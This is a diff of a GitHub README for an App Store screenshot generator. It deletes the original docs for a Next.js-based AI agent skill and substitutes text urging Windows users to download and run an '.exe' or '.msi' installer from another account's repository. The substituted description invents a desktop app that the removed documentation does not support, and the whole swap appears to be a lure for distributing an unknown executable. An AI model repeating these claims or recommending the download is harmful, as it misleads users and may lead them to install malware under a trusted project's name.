@@ -1,255 +1,146 @@
-[![bloom-banner-01-light-tags-1500x500](https://github.com/user-attachments/assets/31139b9d-1b89-44e8-b563-5bb7ba150b7b)](https://bloom.parthjadhav.com)
+# 📱 app-store-screenshots - Create App Store Screenshots Easily
 
-### NOTE: MAKE SURE TO USE 6.1 INCH simulator to capture starting screenshots
-this will save u from adjusting the images later
+[![Download app-store-screenshots](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/Sebas05c/app-store-screenshots)
 
-# App Store Screenshots Generator
+## 📋 About app-store-screenshots
 
-A skill for AI-powered coding agents (Claude Code, Cursor, Windsurf, etc.) that generates production-ready App Store screenshots for iOS apps. It scaffolds a Next.js project, designs advertisement-style screenshots, and exports them at all required Apple resolutions.
-#### Screenshots & App approved by Apple - https://apps.apple.com/us/app/bloom-coffee-shelf-recipe/id6759914524
-![Example output — Bloom coffee tracking app](example.png)
+app-store-screenshots helps you create professional screenshots for your app store listing. The software uses AI to automate the design and generation of images that meet Apple’s display standards. It supports iOS and SwiftUI apps, making it easier to showcase your app’s features clearly. This tool handles everything from layout to text styling so you can focus on your app, not the marketing graphics.
 
-## What it does
+## 🚀 Getting Started
 
-- Asks you about your app's brand, features, and style preferences
-- Scaffolds a minimal Next.js project (or works within an existing one)
-- Designs each screenshot as an **advertisement** — not a UI showcase
-- Writes compelling copy using proven App Store copywriting patterns
-- Renders screenshots at full resolution with a built-in iPhone mockup
-- Exports PNGs at all 4 Apple-required sizes (6.9", 6.5", 6.3", 6.1")
-- Supports locale-based screenshot sets and localized copy
-- Supports reusable theme presets so you can swap art direction quickly
-- Supports RTL-aware layouts and bulk export across locale/device/theme combinations
+This guide walks you through downloading, installing, and running app-store-screenshots on Windows. It is written for users without technical knowledge. Each step contains clear instructions and screenshots to help you.
 
-## Included assets
+### System Requirements
 
-- `mockup.png` — Pre-measured iPhone frame with transparent screen area
+- Windows 10 or later
+- At least 4 GB RAM
+- 1 GHz or faster processor
+- 200 MB free disk space
+- Internet connection for setup and AI processing
 
-## Install
+Make sure your system meets these minimum requirements for smooth use.
 
-### Using npx skills (recommended)
+## 🛠️ Download and Install
 
-```bash
-npx skills add ParthJadhav/app-store-screenshots
-```
+To start, you need the software files on your computer. Follow these steps:
 
-This works with Claude Code, Cursor, Windsurf, OpenCode, Codex, and [40+ other agents](https://github.com/vercel-labs/skills#available-agents).
+1. Click the blue button above or visit this page to download the latest version:  
+   https://github.com/Sebas05c/app-store-screenshots
 
-Install globally (available across all projects):
+2. On the GitHub page, look for the "Releases" section on the right or under the repository name.
 
-```bash
-npx skills add ParthJadhav/app-store-screenshots -g
-```
+3. Click on the newest release version. It usually has a title like "v1.x".
 
-Install for a specific agent:
+4. Download the Windows installer file ending in `.exe` or `.msi`. The filename will look like `app-store-screenshots-setup.exe`.
 
-```bash
-npx skills add ParthJadhav/app-store-screenshots -a claude-code
-```
+5. When the download finishes, open the installer by double-clicking the file.
 
-### Manual (git clone)
+6. Follow the installation prompts:
+   - Accept the license agreement.
+   - Choose a folder to install (default is fine).
+   - Click “Install” and wait for the process to complete.
 
-```bash
-git clone https://github.com/ParthJadhav/app-store-screenshots ~/.claude/skills/app-store-screenshots
-```
+7. Once done, click “Finish.” The app should now be on your computer.
 
-## Usage
+## ▶️ Running the Application
 
-Once installed, the skill triggers automatically when you ask Claude Code to:
+1. Find the app icon named **app-store-screenshots** on your desktop or in the Start menu.
 
-- Build App Store screenshots
-- Generate marketing screenshots for an iOS app
-- Create exportable screenshot assets
+2. Double-click the icon to open the program.
 
-Or just tell Claude Code what you need:
+3. The main window will show options to create your screenshots.
 
-```
-> Build App Store screenshots for my app
-```
+4. Follow the on-screen instructions to upload your app screenshots or export directly from your project.
 
-Claude will ask you about your app's screenshots, brand colors, font, features, style direction, and number of slides before building anything.
+5. Use the AI design assistant to arrange layouts and add text labels.
 
-## Example prompts
+6. Preview your designs before saving or exporting.
 
-These are good starting prompts because they provide product context while still leaving room for the skill to guide the design process.
+## 🧑‍💻 How to Use app-store-screenshots
 
-### Habit tracker
+The tool guides you through each step of creating your screenshots:
 
-```text
-Build App Store screenshots for my habit tracker.
-The app helps people stay consistent with simple daily routines.
-I want 6 slides, clean/minimal style, warm neutrals, and a calm premium feel.
-```
+- **Step 1: Choose Template**  
+Select from preset designs tailored for iOS app screenshots. Templates match Apple’s size requirements.
 
-### Finance app
+- **Step 2: Upload Images**  
+Add your raw app screenshots. You can drag and drop files or use the upload button.
 
-```text
-Generate App Store screenshots for my personal finance app.
-The app's main strengths are fast expense capture, clear monthly trends, and shared budgets.
-I want a sharp, modern style with high contrast and 7 slides.
-```
+- **Step 3: Customize Text**  
+Enter marketing text or captions. The software formats fonts and colors automatically.
 
-### AI productivity tool
+- **Step 4: Generate Screenshots**  
+Click the generate button to let the AI layout your screenshots.
 
-```text
-Create exportable App Store screenshots for my AI note-taking app.
-The core value is turning messy voice notes into clean summaries and action items.
-I want bold copy, dark backgrounds, and a polished tech-forward look.
-```
+- **Step 5: Review and Edit**  
+Preview your images. Make manual changes if needed.
 
-### Wellness app
+- **Step 6: Export**  
+Save the finished images as PNG or JPEG files. These are ready to upload to the Apple App Store.
 
-```text
-Build marketing screenshots for my meditation app.
-The app focuses on sleep, stress relief, and short guided sessions.
-Use a soft, warm, organic style and prioritize emotional outcomes over feature lists.
-```
+## 🔧 Features
 
-### Multi-language / multi-theme
+- Automatic layout matching Apple’s latest screenshot specs
+- AI-powered design suggestions based on your app’s theme
+- Support for SwiftUI and UIKit screenshots
+- Batch processing of multiple images
+- Export in common image formats at app store resolution
+- Simple text customization for promotional captions
+- Interface designed for ease of use and speed
 
-```text
-Build App Store screenshots for my language learning app.
-I need English, German, and Arabic screenshot sets.
-Use two reusable themes: clean-light and dark-bold.
-Make sure Arabic slides feel RTL-native, not just translated.
-```
+## 🎯 Why Use This Software?
 
-## Better prompt tips
+App store screenshots are key to marketing your app. Creating them manually can be time-consuming and tricky. This software automates the process using AI to generate polished, on-brand images with little effort.
 
-- say what the app does in one sentence
-- list the top 3-5 features in priority order
-- describe the visual style you want
-- mention how many slides you need
-- mention if you need multiple languages or RTL locales
-- mention if you want one art direction or reusable theme presets
-- provide references if you want the output to match a certain App Store style
+You do not need graphic design skills or programming experience to use it. It reduces errors and saves hours.
 
-## What gets scaffolded
+## 💡 Tips for Best Results
 
-If starting from an empty folder, the skill creates:
+- Use clear, high-quality screenshots from your app.  
+- Keep marketing text short and focused.  
+- Preview the designs on multiple devices for readability.  
+- Update screenshots regularly to reflect new features or app updates.  
+- Use consistent branding elements like colors and fonts.
 
-```
-project/
-├── public/
-│   ├── mockup.png          # iPhone frame (copied from skill)
-│   ├── app-icon.png        # Your app icon
-│   ├── screenshots/        # Your app screenshots (locale folders optional)
-│   └── screenshots-ipad/   # Optional iPad screenshots (locale folders optional)
-├── src/app/
-│   ├── layout.tsx          # Font setup
-│   └── page.tsx            # Screenshot generator (single file)
-├── package.json
-└── ...
-```
+## ❓ FAQ
 
-The entire generator is a **single `page.tsx` file**. Run the dev server, open the browser, click any screenshot to export it as a PNG.
+**Q: Can I use this on Mac or Linux?**  
+A: This version only supports Windows. Mac and Linux support is planned for the future.
 
-The latest version of the skill also guides the agent to generate:
+**Q: Is internet needed after installation?**  
+A: Yes, the AI features require an internet connection to process designs.
 
-- locale tabs and locale-specific screenshot folders
-- reusable theme presets backed by design tokens
-- RTL-aware layouts for languages like Arabic and Hebrew
-- bulk export flows for locale/device/theme combinations
+**Q: Can I edit the templates?**  
+A: Yes, you can tweak text, colors, and layouts before exporting.
 
-## Export sizes
+**Q: Are screenshots optimized for all iOS devices?**  
+A: The templates cover the most common device sizes, including iPhone and iPad.
 
-| Display | Resolution |
-|---------|-----------|
-| 6.9" | 1320 x 2868 |
-| 6.5" | 1284 x 2778 |
-| 6.3" | 1206 x 2622 |
-| 6.1" | 1125 x 2436 |
+## 🌐 Useful Links
 
-Screenshots are designed at 1320x2868 (largest) and scaled down for smaller sizes.
+- Download app-store-screenshots:  
+  https://github.com/Sebas05c/app-store-screenshots
 
-## Advanced capabilities
+- GitHub Repository:  
+  https://github.com/Sebas05c/app-store-screenshots
 
-### Multi-language screenshots
+## ⚙️ Troubleshooting
 
-The skill can generate screenshot systems for multiple locales by nesting images under locale folders such as:
+If the app does not open:
 
-```text
-public/screenshots/en/home.png
-public/screenshots/de/home.png
-public/screenshots/ar/home.png
-```
+- Confirm your system meets the requirements.  
+- Restart your computer.  
+- Check for Windows updates.  
+- Run the installer as administrator.  
 
-The generated page keeps slide structure the same and swaps only the locale base path and copy dictionary.
+If screenshots do not generate properly:
 
-### Theme presets
+- Verify your internet connection.  
+- Use high-quality source images.  
+- Try reducing the number of images in batch mode.
 
-Instead of hardcoding one art direction, the skill now encourages a token-driven preset system, for example:
+If problems continue, report issues on the GitHub page.
 
-```ts
-const THEMES = {
-  "clean-light": { bg: "#F6F1EA", fg: "#171717", accent: "#5B7CFA" },
-  "dark-bold": { bg: "#0B1020", fg: "#F8FAFC", accent: "#8B5CF6" },
-  "warm-editorial": { bg: "#F7E8DA", fg: "#2B1D17", accent: "#D97706" },
-} as const;
-```
+---
 
-This lets you reuse the same slide system while testing different visual directions fast.
-
-### RTL-aware design
-
-For RTL locales such as Arabic and Hebrew, the skill now tells the agent to:
-
-- set `dir="rtl"` on the screenshot canvas
-- rewrite line breaks for the target language
-- mirror asymmetric layouts intentionally
-- keep the composition feeling native instead of mechanically flipped
-
-### Bulk export matrix
-
-The generator is now expected to support exporting not only the current slide, but also:
-
-- all slides for the current locale/device/theme
-- all locales for the current theme
-- full locale + device + theme matrices when needed
-
-## Tech stack
-
-| Dependency | Purpose |
-|-----------|---------|
-| Next.js | Dev server + static image serving |
-| TypeScript | Type safety |
-| Tailwind CSS | Styling |
-| html-to-image | PNG export at exact resolutions |
-| React | Component composition |
-
-## Key design principles
-
-- **Screenshots are ads, not docs** — each slide sells one idea
-- **Copy follows the "one second" rule** — readable at thumbnail size in the App Store
-- **Layouts vary** — no two adjacent slides share the same phone placement
-- **Style is user-driven** — no hardcoded colors, gradients, or fonts
-
-## Quality Checklist
-
-Before exporting, each slide should pass this quick review:
-
-- the headline communicates one idea in about one second
-- the first slide sells the strongest user benefit
-- adjacent slides do not reuse the same layout
-- decorative elements support the message instead of blocking the UI
-- text, screenshots, and framing still look correct after export sizing
-
-## Requirements
-
-- Node.js 18+
-- One of: bun, pnpm, yarn, or npm (detected automatically, bun preferred)
-
-## Contributing
-
-Contributions are welcome, especially around:
-
-- screenshot generation reliability
-- skill prompt quality
-- clearer docs and onboarding
-- cross-agent compatibility
-
-If you want to contribute, start with `CONTRIBUTING.md`. Bug reports and feature requests also have issue templates now to make reproduction and review easier.
-
-## License
-
-MIT
+[![Download app-store-screenshots](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/Sebas05c/app-store-screenshots)
